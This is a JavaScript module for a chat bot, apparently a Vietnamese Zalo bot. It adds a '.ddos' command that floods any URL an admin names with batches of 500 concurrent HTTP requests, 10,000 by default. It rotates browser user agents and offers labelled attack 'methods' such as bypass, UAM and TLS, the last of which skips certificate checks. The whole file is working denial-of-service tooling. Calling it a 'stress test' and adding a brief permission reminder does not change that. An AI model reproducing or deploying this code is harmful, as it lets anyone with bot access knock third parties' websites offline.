import axios from "axios";
import https from "node:https";
import { log } from "../logger.js";

export const name = "ddos";
export const description = "Lệnh kiểm tra tải hệ thống (Stress Test)";

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
];

const attack_threads = new Map();

async function send_request(target_url, method) {
    const headers = { 'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] };
    try {
        let url = target_url;
        let axiosMethod = "get";
        let data = null;
        let httpsAgent = new https.Agent({ keepAlive: true });

        switch (method) {
            case "bypass": url += "/bypass"; break;
            case "uam": url += "/uam"; break;
            case "r2": url += "/r2"; break;
            case "tls": 
                httpsAgent = new https.Agent({ rejectUnauthorized: false, keepAlive: true });
                break;
            case "gyat":
                axiosMethod = "post";
                data = { gyat: "attack" };
                break;
        }

        const config = { 
            headers, 
            timeout: 5000,
            httpsAgent,
            validateStatus: () => true 
        };

        if (axiosMethod === "post") {
            return (await axios.post(url, data, config)).status;
        } else {
            return (await axios.get(url, config)).status;
        }
    } catch (e) {
        return null;
    }
}

async function run_attack(ctx, target_url, method, num_requests = 10000) {
    const threadId = ctx.threadId;
    const thread_state = attack_threads.get(threadId);
    if (!thread_state) return;

    thread_state.requests_sent = 0;
    
    while (thread_state.running && thread_state.requests_sent < num_requests) {
        const batch_size = 500; // Gửi 500 yêu cầu cùng lúc (Node.js xử lý tốt hơn Python về mặt này)
        const tasks = [];
        
        for (let i = 0; i < batch_size && thread_state.requests_sent < num_requests; i++) {
            if (!thread_state.running) break;
            tasks.push(send_request(target_url, method));
            thread_state.requests_sent++;
        }

        await Promise.allSettled(tasks);
        
        // Nghỉ nhẹ để tránh nghẽn event loop
        await new Promise(r => setTimeout(r, 10));
    }

    log.info(`[DDOS] Attack on ${target_url} with ${method.toUpperCase()} stopped after ${thread_state.requests_sent} requests.`);
    
    if (thread_state.running) {
        await ctx.api.sendMessage({
            msg: `✔️ Hoàn thành tấn công ${method.toUpperCase()} trên ${target_url} với ${thread_state.requests_sent} yêu cầu!`
        }, ctx.threadId, ctx.threadType);
        attack_threads.delete(threadId);
    }
}

function isAdmin(ctx) {
    return ctx.adminIds.includes(String(ctx.senderId));
}

export const commands = {
    ddos: async (ctx) => {
        if (!isAdmin(ctx)) {
            return ctx.api.sendMessage({ msg: "⚠️ Bạn không phải admin BOT!" }, ctx.threadId, ctx.threadType);
        }

        const args = ctx.args || [];
        if (args.length === 0) {
            return ctx.api.sendMessage({
                msg: `🔥 HỆ THỐNG DDOS 🔥\n` +
                    `➤ Cú pháp: .ddos <index> <linkweb> [số requests]\n` +
                    `➤ Chọn index (1-7):\n` +
                    `1. Flood\n2. Bypass\n3. UAM\n4. TLS\n5. HTTPS\n6. R2\n7. Gyat\n` +
                    `➤ Số requests mặc định: 10000\n` +
                    `➤ Dừng tấn công: .ddos stop\n` +
                    `➤ Lưu ý: Chỉ dùng trên hệ thống bạn có quyền!`
            }, ctx.threadId, ctx.threadType);
        }

        if (args[0] === "stop") {
            const state = attack_threads.get(ctx.threadId);
            if (state && state.running) {
                state.running = false;
                attack_threads.delete(ctx.threadId);
                return ctx.api.sendMessage({ msg: "✔️ Đã dừng tấn công DDoS!" }, ctx.threadId, ctx.threadType);
            } else {
                return ctx.api.sendMessage({ msg: "⚠️ Không có tấn công nào đang chạy!" }, ctx.threadId, ctx.threadType);
            }
        }

        if (args.length < 2) {
            return ctx.api.sendMessage({ msg: "⚠️ Cú pháp: .ddos <index (1-7)> <linkweb> [số requests]" }, ctx.threadId, ctx.threadType);
        }

        const index = args[0];
        const target_url = args[1].startsWith("http") ? args[1] : `http://${args[1]}`;
        const num_requests = parseInt(args[2]) || 10000;

        const methods = {
            "1": "flood",
            "2": "bypass",
            "3": "uam",
            "4": "tls",
            "5": "https",
            "6": "r2",
            "7": "gyat"
        };

        const method = methods[index];
        if (!method) {
            return ctx.api.sendMessage({ msg: "⚠️ Sai Số Thứ Tự (1-7)" }, ctx.threadId, ctx.threadType);
        }

        if (attack_threads.has(ctx.threadId)) {
            return ctx.api.sendMessage({ msg: "⚠️ Đang chạy tấn công khác, vui lòng dừng trước!" }, ctx.threadId, ctx.threadType);
        }

        attack_threads.set(ctx.threadId, { running: true, requests_sent: 0 });

        ctx.api.sendMessage({
            msg: `✔️ Bắt đầu tấn công ${method.toUpperCase()} trên ${target_url} với ${num_requests} yêu cầu! (Dừng bằng .ddos stop)`
        }, ctx.threadId, ctx.threadType);

        run_attack(ctx, target_url, method, num_requests).catch(e => {
            log.error(`[DDOS] Error in run_attack: ${e.message}`);
        });
    }
};
